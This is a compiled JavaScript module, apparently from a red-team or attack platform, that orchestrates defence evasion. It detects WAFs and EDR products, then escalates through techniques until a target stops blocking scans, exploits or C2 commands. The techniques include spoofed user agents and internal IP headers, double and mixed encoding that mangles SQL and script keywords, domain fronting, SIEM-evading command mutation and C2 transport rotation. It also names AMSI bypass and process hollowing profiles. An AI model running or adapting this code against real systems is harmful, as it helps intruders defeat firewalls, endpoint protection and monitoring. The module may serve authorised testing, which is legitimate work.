import {
  generateMutations
} from "./chunk-JGUFAE3I.js";

// server/lib/evasion-orchestrator.ts
var WAF_SIGNATURES = [
  { pattern: /cloudflare/i, waf: "Cloudflare" },
  { pattern: /akamai/i, waf: "Akamai" },
  { pattern: /imperva|incapsula/i, waf: "Imperva/Incapsula" },
  { pattern: /aws\s*waf|awselb/i, waf: "AWS WAF" },
  { pattern: /mod_security|modsec/i, waf: "ModSecurity" },
  { pattern: /sucuri/i, waf: "Sucuri" },
  { pattern: /barracuda/i, waf: "Barracuda" },
  { pattern: /f5\s*big-?ip|asm/i, waf: "F5 BIG-IP ASM" },
  { pattern: /fortiweb|fortigate/i, waf: "Fortinet" },
  { pattern: /palo\s*alto/i, waf: "Palo Alto" },
  { pattern: /access\s*denied|request\s*blocked|security\s*violation/i, waf: "Generic WAF" },
  { pattern: /captcha|challenge|verify.*human/i, waf: "CAPTCHA Challenge" }
];
var EDR_SIGNATURES = [
  { pattern: /crowdstrike|falcon/i, edr: "CrowdStrike Falcon" },
  { pattern: /sentinelone|sentinel/i, edr: "SentinelOne" },
  { pattern: /carbon\s*black|vmware.*edr/i, edr: "VMware Carbon Black" },
  { pattern: /defender|microsoft.*antimalware/i, edr: "Windows Defender" },
  { pattern: /cylance/i, edr: "Cylance" },
  { pattern: /sophos/i, edr: "Sophos" },
  { pattern: /kaspersky/i, edr: "Kaspersky" },
  { pattern: /bitdefender/i, edr: "Bitdefender" },
  { pattern: /malwarebytes/i, edr: "Malwarebytes" },
  { pattern: /eset/i, edr: "ESET" }
];
function detectBlockSignal(response) {
  const defenses = [];
  if (response.statusCode === 403) {
    const wafMatch = response.body ? WAF_SIGNATURES.find((s) => s.pattern.test(response.body)) : null;
    if (wafMatch) defenses.push(wafMatch.waf);
    return { blocked: true, signal: "http_403", defenses };
  }
  if (response.statusCode === 406) return { blocked: true, signal: "http_406", defenses: ["Input Validation"] };
  if (response.statusCode === 429) return { blocked: true, signal: "http_429", defenses: ["Rate Limiter"] };
  if (response.statusCode === 503) {
    const wafMatch = response.body ? WAF_SIGNATURES.find((s) => s.pattern.test(response.body)) : null;
    if (wafMatch) defenses.push(wafMatch.waf);
    return { blocked: true, signal: "http_503", defenses };
  }
  if (response.body) {
    for (const sig of WAF_SIGNATURES) {
      if (sig.pattern.test(response.body)) {
        defenses.push(sig.waf);
      }
    }
    if (defenses.length > 0) return { blocked: true, signal: "waf_page", defenses };
  }
  if (response.headers) {
    const serverHeader = response.headers["server"] || response.headers["Server"] || "";
    const wafHeader = response.headers["x-waf-status"] || response.headers["x-sucuri-id"] || "";
    for (const sig of WAF_SIGNATURES) {
      if (sig.pattern.test(serverHeader) || sig.pattern.test(wafHeader)) {
        defenses.push(sig.waf);
      }
    }
    if (defenses.length > 0) return { blocked: true, signal: "waf_page", defenses };
  }
  if (response.error) {
    if (/ECONNRESET|connection reset/i.test(response.error)) {
      return { blocked: true, signal: "connection_reset", defenses: ["Network Firewall"] };
    }
    if (/ETIMEDOUT|timeout/i.test(response.error)) {
      return { blocked: true, signal: "connection_timeout", defenses: ["Network Firewall"] };
    }
    if (/ECONNREFUSED/i.test(response.error)) {
      return { blocked: true, signal: "connection_reset", defenses: ["Host Firewall"] };
    }
    for (const sig of EDR_SIGNATURES) {
      if (sig.pattern.test(response.error)) {
        defenses.push(sig.edr);
      }
    }
    if (/killed|terminated|quarantine/i.test(response.error)) {
      return { blocked: true, signal: defenses.length > 0 ? "edr_quarantine" : "process_killed", defenses };
    }
    if (/amsi|antimalware/i.test(response.error)) {
      return { blocked: true, signal: "amsi_block", defenses: defenses.length > 0 ? defenses : ["AMSI"] };
    }
    if (/sandbox|emulat/i.test(response.error)) {
      return { blocked: true, signal: "sandbox_detected", defenses: ["Sandbox Detection"] };
    }
  }
  if (!response.body && !response.error && response.statusCode === void 0) {
    return { blocked: true, signal: "empty_response", defenses: ["Silent Drop"] };
  }
  return { blocked: false, signal: "unknown_block", defenses };
}
var UA_POOL = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0"
];
var ESCALATION_LADDER = [
  // ── Level 1: Minimal evasion (scanning) ──────────────────────────
  {
    id: "ua_rotation",
    name: "User-Agent Rotation",
    category: "header_manipulation",
    level: 1,
    description: "Rotate User-Agent strings to avoid fingerprint-based blocking",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1071.001",
    apply: (ctx) => ({
      ...ctx,
      userAgent: UA_POOL[Math.floor(Math.random() * UA_POOL.length)],
      headers: {
        ...ctx.headers,
        "User-Agent": UA_POOL[Math.floor(Math.random() * UA_POOL.length)]
      },
      metadata: { ...ctx.metadata, evasion_ua_rotated: true }
    })
  },
  {
    id: "header_normalization",
    name: "Header Normalization & Spoofing",
    category: "header_manipulation",
    level: 1,
    description: "Add legitimate-looking headers (Accept, Referer, Accept-Language) to mimic real browser traffic",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1071.001",
    apply: (ctx) => ({
      ...ctx,
      headers: {
        ...ctx.headers,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": ctx.url ? new URL(ctx.url).origin + "/" : "https://www.google.com/",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0"
      },
      metadata: { ...ctx.metadata, evasion_headers_normalized: true }
    })
  },
  // ── Level 1: Minimal evasion (C2) ────────────────────────────────
  {
    id: "sleep_jitter",
    name: "Sleep Jitter Randomization",
    category: "timing",
    level: 1,
    description: "Randomize callback intervals to avoid periodic-beacon detection",
    applicableTo: ["c2"],
    mitreTechnique: "T1029",
    apply: (ctx) => ({
      ...ctx,
      sleepInterval: (ctx.sleepInterval || 3e4) + Math.floor(Math.random() * 15e3),
      jitter: Math.floor(Math.random() * 40) + 10,
      // 10-50% jitter
      metadata: { ...ctx.metadata, evasion_jitter_applied: true }
    })
  },
  // ── Level 2: Moderate evasion ────────────────────────────────────
  {
    id: "rate_throttle",
    name: "Adaptive Rate Throttling",
    category: "timing",
    level: 2,
    description: "Slow down request rate and add random delays to evade rate-limiting WAFs",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1029",
    apply: (ctx) => ({
      ...ctx,
      delay: (ctx.delay || 0) + 2e3 + Math.floor(Math.random() * 3e3),
      metadata: { ...ctx.metadata, evasion_throttled: true }
    })
  },
  {
    id: "url_encoding",
    name: "URL/Parameter Encoding",
    category: "encoding",
    level: 2,
    description: "Double-encode or use alternative encodings for URL parameters to bypass WAF pattern matching",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1027",
    apply: (ctx) => ({
      ...ctx,
      encoding: "double_url",
      url: ctx.url ? doubleEncodeParams(ctx.url) : ctx.url,
      metadata: { ...ctx.metadata, evasion_encoding: "double_url" }
    })
  },
  {
    id: "protocol_rotation",
    name: "C2 Protocol Rotation",
    category: "protocol",
    level: 2,
    description: "Switch C2 transport protocol (mTLS \u2192 HTTPS \u2192 DNS \u2192 WireGuard) to evade protocol-specific detection",
    applicableTo: ["c2"],
    mitreTechnique: "T1071",
    apply: (ctx) => {
      const protocols = ["mtls", "https", "dns", "wg"];
      const currentIdx = protocols.indexOf(ctx.transport || "https");
      const nextProtocol = protocols[(currentIdx + 1) % protocols.length];
      return {
        ...ctx,
        transport: nextProtocol,
        metadata: { ...ctx.metadata, evasion_protocol: nextProtocol }
      };
    }
  },
  {
    id: "command_mutation",
    name: "Command Mutation (SIEM Bypass)",
    category: "mutation",
    level: 2,
    description: "Apply case/path/encoding mutations to commands to evade SIEM detection rules",
    applicableTo: ["c2", "exploit"],
    mitreTechnique: "T1027",
    apply: (ctx) => {
      if (!ctx.command) return ctx;
      const mutations = generateMutations(ctx.command, {
        maxPerCategory: 1,
        categories: ["case_mutation", "env_var_substitution", "encoding_mutation"]
      });
      const bestMutation = mutations[0];
      return {
        ...ctx,
        command: bestMutation ? bestMutation.mutated : ctx.command,
        metadata: {
          ...ctx.metadata,
          evasion_mutation: bestMutation?.category || "none",
          evasion_original_command: ctx.command
        }
      };
    }
  },
  // ── Level 3: Aggressive evasion ──────────────────────────────────
  {
    id: "ip_header_spoof",
    name: "IP Header Spoofing",
    category: "header_manipulation",
    level: 3,
    description: "Add X-Forwarded-For, X-Real-IP, and X-Originating-IP headers with internal/trusted IPs",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1090",
    apply: (ctx) => {
      const spoofedIp = `10.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
      return {
        ...ctx,
        headers: {
          ...ctx.headers,
          "X-Forwarded-For": spoofedIp,
          "X-Real-IP": spoofedIp,
          "X-Originating-IP": spoofedIp,
          "X-Client-IP": spoofedIp,
          "CF-Connecting-IP": spoofedIp,
          "True-Client-IP": spoofedIp
        },
        metadata: { ...ctx.metadata, evasion_ip_spoofed: spoofedIp }
      };
    }
  },
  {
    id: "payload_transform_low",
    name: "Payload Transform \u2014 Low Profile",
    category: "payload",
    level: 3,
    description: "Apply shellcode conversion and string encryption to evade static signature detection",
    applicableTo: ["c2", "exploit"],
    mitreTechnique: "T1027.009",
    apply: (ctx) => ({
      ...ctx,
      pipelineProfile: "low",
      obfuscationLevel: 1,
      metadata: { ...ctx.metadata, evasion_pipeline: "low" }
    })
  },
  {
    id: "http_method_override",
    name: "HTTP Method Override",
    category: "protocol",
    level: 3,
    description: "Use X-HTTP-Method-Override or alternative methods to bypass method-based WAF rules",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1071.001",
    apply: (ctx) => ({
      ...ctx,
      method: "POST",
      headers: {
        ...ctx.headers,
        "X-HTTP-Method-Override": ctx.method || "GET",
        "X-Method-Override": ctx.method || "GET"
      },
      metadata: { ...ctx.metadata, evasion_method_override: true }
    })
  },
  {
    id: "chunked_transfer",
    name: "Chunked Transfer Encoding",
    category: "encoding",
    level: 3,
    description: "Split request body into small chunks to evade WAF body inspection that operates on full buffers",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1027",
    apply: (ctx) => ({
      ...ctx,
      headers: {
        ...ctx.headers,
        "Transfer-Encoding": "chunked"
      },
      metadata: { ...ctx.metadata, evasion_chunked: true }
    })
  },
  // ── Level 3: Aggressive C2 evasion ───────────────────────────────
  {
    id: "domain_fronting",
    name: "Domain Fronting",
    category: "protocol",
    level: 3,
    description: "Route C2 traffic through legitimate CDN domains to evade network-level inspection",
    applicableTo: ["c2"],
    mitreTechnique: "T1090.004",
    apply: (ctx) => ({
      ...ctx,
      headers: {
        ...ctx.headers,
        "Host": "legitimate-cdn.example.com"
      },
      metadata: { ...ctx.metadata, evasion_domain_fronting: true }
    })
  },
  // ── Level 4: Heavy evasion ───────────────────────────────────────
  {
    id: "payload_transform_medium",
    name: "Payload Transform \u2014 Medium Profile",
    category: "payload",
    level: 4,
    description: "Apply shellcode conversion + direct syscalls + process injection to evade EDR hooks",
    applicableTo: ["c2", "exploit"],
    mitreTechnique: "T1055",
    apply: (ctx) => ({
      ...ctx,
      pipelineProfile: "medium",
      obfuscationLevel: 2,
      metadata: { ...ctx.metadata, evasion_pipeline: "medium" }
    })
  },
  {
    id: "advanced_mutation",
    name: "Advanced Command Mutation",
    category: "mutation",
    level: 4,
    description: "Apply all mutation categories including path mutation, argument reorder, string concatenation, and interpreter chains",
    applicableTo: ["c2", "exploit"],
    mitreTechnique: "T1027",
    apply: (ctx) => {
      if (!ctx.command) return ctx;
      const mutations = generateMutations(ctx.command, {
        maxPerCategory: 2,
        categories: [
          "case_mutation",
          "path_mutation",
          "env_var_substitution",
          "encoding_mutation",
          "separator_mutation",
          "argument_mutation",
          "alias_substitution",
          "whitespace_mutation",
          "string_concat"
        ]
      });
      const bestMutation = mutations.sort(
        (a, b) => b.mutated.length - b.mutated.length - (a.mutated.length - a.mutated.length)
      )[0];
      return {
        ...ctx,
        command: bestMutation ? bestMutation.mutated : ctx.command,
        metadata: {
          ...ctx.metadata,
          evasion_advanced_mutation: bestMutation?.category || "none",
          evasion_original_command: ctx.metadata.evasion_original_command || ctx.command
        }
      };
    }
  },
  {
    id: "waf_bypass_payloads",
    name: "WAF Bypass Payload Variants",
    category: "encoding",
    level: 4,
    description: "Use null bytes, unicode normalization, and mixed encoding to bypass WAF pattern matching",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1027",
    apply: (ctx) => ({
      ...ctx,
      encoding: "mixed_bypass",
      body: ctx.body ? applyWafBypassEncoding(ctx.body) : ctx.body,
      metadata: { ...ctx.metadata, evasion_waf_bypass_encoding: true }
    })
  },
  // ── Level 5: Maximum evasion ─────────────────────────────────────
  {
    id: "payload_transform_high",
    name: "Payload Transform \u2014 High Profile",
    category: "payload",
    level: 5,
    description: "Full evasion pipeline: shellcode + syscalls + NTDLL unhook + ETW patch + AMSI bypass + code signing + process hollowing",
    applicableTo: ["c2", "exploit"],
    mitreTechnique: "T1055.012",
    apply: (ctx) => ({
      ...ctx,
      pipelineProfile: "high",
      obfuscationLevel: 3,
      metadata: { ...ctx.metadata, evasion_pipeline: "high" }
    })
  },
  {
    id: "full_header_evasion",
    name: "Full Header Evasion Suite",
    category: "header_manipulation",
    level: 5,
    description: "Combine all header techniques: UA rotation, IP spoofing, method override, custom headers, and cache busting",
    applicableTo: ["scanning", "exploit"],
    mitreTechnique: "T1071.001",
    apply: (ctx) => {
      const spoofedIp = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
      return {
        ...ctx,
        userAgent: UA_POOL[Math.floor(Math.random() * UA_POOL.length)],
        headers: {
          ...ctx.headers,
          "User-Agent": UA_POOL[Math.floor(Math.random() * UA_POOL.length)],
          "X-Forwarded-For": spoofedIp,
          "X-Real-IP": spoofedIp,
          "X-Originating-IP": `127.0.0.1`,
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
          "Accept-Encoding": "gzip, deflate",
          "Connection": "keep-alive",
          "Cache-Control": "no-cache",
          "Pragma": "no-cache",
          "X-Custom-Header": `req-${Date.now()}`
        },
        metadata: { ...ctx.metadata, evasion_full_header_suite: true }
      };
    }
  },
  {
    id: "staged_delivery",
    name: "Staged Payload Delivery",
    category: "payload",
    level: 5,
    description: "Split exploit into small staged components \u2014 initial dropper fetches encrypted payload from separate channel",
    applicableTo: ["exploit"],
    mitreTechnique: "T1104",
    apply: (ctx) => ({
      ...ctx,
      stager: "multi_stage",
      metadata: { ...ctx.metadata, evasion_staged: true, evasion_stages: 3 }
    })
  }
];
function doubleEncodeParams(url) {
  try {
    const parsed = new URL(url);
    const params = new URLSearchParams(parsed.search);
    const newParams = new URLSearchParams();
    for (const [key, value] of params) {
      newParams.set(key, encodeURIComponent(value));
    }
    parsed.search = newParams.toString();
    return parsed.toString();
  } catch {
    return url;
  }
}
function applyWafBypassEncoding(body) {
  return body.replace(/select/gi, "SeLeCt").replace(/union/gi, "UnIoN").replace(/script/gi, "scr\0ipt").replace(/<\//g, "<\\/").replace(/'/g, "%27").replace(/"/g, "%22");
}
function generateFindingId() {
  return `evf-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
}
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
var DEFAULT_CONFIG = {
  maxAttempts: 12,
  delayBetweenAttempts: 500,
  jitterRange: 300,
  abortOnFirstSuccess: true,
  recordAllAttempts: true,
  domain: "scanning"
};
function getEscalationLadder(domain) {
  return ESCALATION_LADDER.filter((t) => t.applicableTo.includes(domain)).sort((a, b) => a.level - b.level);
}
async function runEvasionLoop(domain, target, operation, initialContext, executeFn, config = {}) {
  const cfg = { ...DEFAULT_CONFIG, ...config, domain };
  const ladder = getEscalationLadder(domain);
  const attempts = [];
  const defensesDetected = /* @__PURE__ */ new Set();
  const startedAt = Date.now();
  let currentContext = { ...initialContext, metadata: { ...initialContext.metadata } };
  let successfulTechnique;
  let finalResult = "blocked";
  {
    const t0 = Date.now();
    try {
      const response = await executeFn(currentContext);
      const latency = Date.now() - t0;
      if (response.success) {
        attempts.push({
          attemptNumber: 0,
          techniqueId: "none",
          techniqueName: "No Evasion (Baseline)",
          techniqueCategory: "baseline",
          description: "Initial attempt without evasion techniques",
          timestamp: t0,
          result: "bypassed",
          responseCode: response.statusCode,
          latencyMs: latency
        });
        finalResult = "bypassed";
        successfulTechnique = {
          id: "none",
          name: "No Evasion Required",
          category: "baseline",
          description: "Target did not block the initial attempt \u2014 no evasion needed",
          escalationLevel: 0
        };
      } else {
        const blockInfo = detectBlockSignal(response);
        blockInfo.defenses.forEach((d) => defensesDetected.add(d));
        attempts.push({
          attemptNumber: 0,
          techniqueId: "none",
          techniqueName: "No Evasion (Baseline)",
          techniqueCategory: "baseline",
          description: "Initial attempt without evasion techniques",
          timestamp: t0,
          result: "blocked",
          blockSignal: blockInfo.signal,
          responseCode: response.statusCode,
          responseSnippet: response.body?.substring(0, 200),
          latencyMs: latency
        });
      }
    } catch (err) {
      const latency = Date.now() - t0;
      const blockInfo = detectBlockSignal({ error: err.message });
      blockInfo.defenses.forEach((d) => defensesDetected.add(d));
      attempts.push({
        attemptNumber: 0,
        techniqueId: "none",
        techniqueName: "No Evasion (Baseline)",
        techniqueCategory: "baseline",
        description: "Initial attempt without evasion techniques",
        timestamp: t0,
        result: "error",
        blockSignal: blockInfo.signal,
        latencyMs: latency
      });
    }
  }
  if (finalResult === "bypassed" && cfg.abortOnFirstSuccess) {
    return buildFinding(domain, target, operation, startedAt, attempts, defensesDetected, successfulTechnique, finalResult, ladder.length);
  }
  for (let i = 0; i < Math.min(ladder.length, cfg.maxAttempts); i++) {
    const technique = ladder[i];
    currentContext = technique.apply(currentContext);
    const jitter = Math.floor(Math.random() * cfg.jitterRange);
    await sleep(cfg.delayBetweenAttempts + jitter);
    const t0 = Date.now();
    try {
      const response = await executeFn(currentContext);
      const latency = Date.now() - t0;
      if (response.success) {
        attempts.push({
          attemptNumber: i + 1,
          techniqueId: technique.id,
          techniqueName: technique.name,
          techniqueCategory: technique.category,
          description: technique.description,
          timestamp: t0,
          result: "bypassed",
          responseCode: response.statusCode,
          latencyMs: latency,
          mutationApplied: currentContext.metadata.evasion_mutation || currentContext.metadata.evasion_advanced_mutation,
          pipelineProfile: currentContext.pipelineProfile
        });
        finalResult = "bypassed";
        successfulTechnique = {
          id: technique.id,
          name: technique.name,
          category: technique.category,
          description: technique.description,
          escalationLevel: technique.level
        };
        if (cfg.abortOnFirstSuccess) break;
      } else {
        const blockInfo = detectBlockSignal(response);
        blockInfo.defenses.forEach((d) => defensesDetected.add(d));
        attempts.push({
          attemptNumber: i + 1,
          techniqueId: technique.id,
          techniqueName: technique.name,
          techniqueCategory: technique.category,
          description: technique.description,
          timestamp: t0,
          result: "blocked",
          blockSignal: blockInfo.signal,
          responseCode: response.statusCode,
          responseSnippet: response.body?.substring(0, 200),
          latencyMs: latency,
          mutationApplied: currentContext.metadata.evasion_mutation || currentContext.metadata.evasion_advanced_mutation,
          pipelineProfile: currentContext.pipelineProfile
        });
      }
    } catch (err) {
      const latency = Date.now() - t0;
      const blockInfo = detectBlockSignal({ error: err.message });
      blockInfo.defenses.forEach((d) => defensesDetected.add(d));
      attempts.push({
        attemptNumber: i + 1,
        techniqueId: technique.id,
        techniqueName: technique.name,
        techniqueCategory: technique.category,
        description: technique.description,
        timestamp: t0,
        result: "error",
        blockSignal: blockInfo.signal,
        latencyMs: latency
      });
    }
  }
  return buildFinding(domain, target, operation, startedAt, attempts, defensesDetected, successfulTechnique, finalResult, ladder.length);
}
function buildFinding(domain, target, operation, startedAt, attempts, defensesDetected, successfulTechnique, finalResult, maxLadderSize) {
  const bypassed = attempts.filter((a) => a.result === "bypassed").length;
  const blocked = attempts.filter((a) => a.result === "blocked").length;
  const maxLevel = Math.max(...attempts.map((a) => {
    const tech = ESCALATION_LADDER.find((t) => t.id === a.techniqueId);
    return tech?.level || 0;
  }), 0);
  const recommendations = [];
  const defenseList = [...defensesDetected];
  if (finalResult === "blocked") {
    recommendations.push("All evasion techniques were blocked \u2014 target has robust defense-in-depth.");
    if (defenseList.length > 0) {
      recommendations.push(`Detected defenses: ${defenseList.join(", ")}. Consider manual testing with custom techniques.`);
    }
    recommendations.push("Review the escalation timeline to identify which defense layer blocked each technique.");
  } else if (finalResult === "bypassed" && successfulTechnique) {
    if (successfulTechnique.escalationLevel === 0) {
      recommendations.push("No defenses detected \u2014 target appears unprotected. Consider recommending WAF/EDR deployment.");
    } else {
      recommendations.push(`Bypass achieved at escalation level ${successfulTechnique.escalationLevel}/5 using "${successfulTechnique.name}".`);
      recommendations.push(`${blocked} technique(s) were blocked before bypass \u2014 defense has partial coverage.`);
      if (defenseList.length > 0) {
        recommendations.push(`Detected defenses (${defenseList.join(", ")}) should be tuned to detect "${successfulTechnique.name}" technique.`);
      }
    }
  }
  return {
    id: generateFindingId(),
    domain,
    target,
    operation,
    startedAt,
    completedAt: Date.now(),
    totalAttempts: attempts.length,
    finalResult,
    successfulTechnique,
    defensesDetected: defenseList,
    attempts,
    evasionScorecard: {
      totalTechniquesTried: attempts.length,
      techniquesBlocked: blocked,
      techniquesBypassed: bypassed,
      escalationDepth: maxLevel,
      maxEscalationLevel: 5,
      bypassRate: attempts.length > 0 ? Math.round(bypassed / attempts.length * 100) : 0,
      defenseEffectiveness: attempts.length > 0 ? Math.round(blocked / attempts.length * 100) : 0
    },
    recommendations
  };
}
async function evasionScan(targetUrl, scanOperation, httpFn, config) {
  const initialContext = {
    url: targetUrl,
    headers: {},
    method: "GET",
    metadata: {}
  };
  return runEvasionLoop(
    "scanning",
    targetUrl,
    scanOperation,
    initialContext,
    async (ctx) => {
      try {
        const result = await httpFn(
          ctx.url || targetUrl,
          ctx.headers || {},
          {
            method: ctx.method,
            body: ctx.body,
            delay: ctx.delay,
            encoding: ctx.encoding
          }
        );
        const success = result.statusCode >= 200 && result.statusCode < 400;
        return {
          success,
          statusCode: result.statusCode,
          body: result.body,
          headers: result.headers
        };
      } catch (err) {
        return { success: false, error: err.message };
      }
    },
    config
  );
}
async function evasionC2Task(sessionTarget, command, taskFn, config) {
  const initialContext = {
    command,
    transport: "https",
    sleepInterval: 3e4,
    metadata: { originalCommand: command }
  };
  return runEvasionLoop(
    "c2",
    sessionTarget,
    `C2 task: ${command.substring(0, 50)}`,
    initialContext,
    async (ctx) => {
      try {
        const result = await taskFn(ctx.command || command, {
          transport: ctx.transport,
          sleepInterval: ctx.sleepInterval,
          jitter: ctx.jitter,
          pipelineProfile: ctx.pipelineProfile
        });
        return {
          success: result.success,
          body: result.output,
          error: result.error
        };
      } catch (err) {
        return { success: false, error: err.message };
      }
    },
    config
  );
}
async function evasionExploit(target, exploitName, exploitPayload, exploitFn, config) {
  const initialContext = {
    url: target,
    exploitPayload,
    headers: {},
    metadata: { exploitName, originalPayload: exploitPayload }
  };
  return runEvasionLoop(
    "exploit",
    target,
    `Exploit: ${exploitName}`,
    initialContext,
    async (ctx) => {
      try {
        const result = await exploitFn(ctx.exploitPayload || exploitPayload, {
          headers: ctx.headers,
          encoding: ctx.encoding,
          pipelineProfile: ctx.pipelineProfile,
          obfuscationLevel: ctx.obfuscationLevel,
          stager: ctx.stager
        });
        return {
          success: result.success,
          statusCode: result.statusCode,
          body: result.body,
          error: result.error
        };
      } catch (err) {
        return { success: false, error: err.message };
      }
    },
    config
  );
}
var findingsStore = [];
function storeFinding(finding) {
  findingsStore.push(finding);
  if (findingsStore.length > 200) findingsStore.shift();
}
function getFindings(filters) {
  let results = [...findingsStore];
  if (filters?.domain) results = results.filter((f) => f.domain === filters.domain);
  if (filters?.result) results = results.filter((f) => f.finalResult === filters.result);
  if (filters?.target) results = results.filter((f) => f.target.includes(filters.target));
  results.sort((a, b) => b.completedAt - a.completedAt);
  return results.slice(0, filters?.limit || 50);
}
function getFindingById(id) {
  return findingsStore.find((f) => f.id === id);
}
function getOrchestratorStats() {
  const byDomain = { scanning: 0, c2: 0, exploit: 0 };
  const byResult = { bypassed: 0, blocked: 0, partial: 0, error: 0 };
  const defenseCount = /* @__PURE__ */ new Map();
  const bypassTechCount = /* @__PURE__ */ new Map();
  let totalDepth = 0;
  let totalBypassRate = 0;
  for (const f of findingsStore) {
    byDomain[f.domain]++;
    byResult[f.finalResult]++;
    totalDepth += f.evasionScorecard.escalationDepth;
    totalBypassRate += f.evasionScorecard.bypassRate;
    for (const d of f.defensesDetected) {
      defenseCount.set(d, (defenseCount.get(d) || 0) + 1);
    }
    if (f.successfulTechnique && f.successfulTechnique.id !== "none") {
      bypassTechCount.set(f.successfulTechnique.name, (bypassTechCount.get(f.successfulTechnique.name) || 0) + 1);
    }
  }
  return {
    totalFindings: findingsStore.length,
    byDomain,
    byResult,
    averageEscalationDepth: findingsStore.length > 0 ? Math.round(totalDepth / findingsStore.length * 10) / 10 : 0,
    averageBypassRate: findingsStore.length > 0 ? Math.round(totalBypassRate / findingsStore.length) : 0,
    topDefenses: [...defenseCount.entries()].map(([defense, count]) => ({ defense, count })).sort((a, b) => b.count - a.count).slice(0, 10),
    topBypassTechniques: [...bypassTechCount.entries()].map(([technique, count]) => ({ technique, count })).sort((a, b) => b.count - a.count).slice(0, 10)
  };
}

export {
  detectBlockSignal,
  ESCALATION_LADDER,
  getEscalationLadder,
  runEvasionLoop,
  evasionScan,
  evasionC2Task,
  evasionExploit,
  storeFinding,
  getFindings,
  getFindingById,
  getOrchestratorStats
};
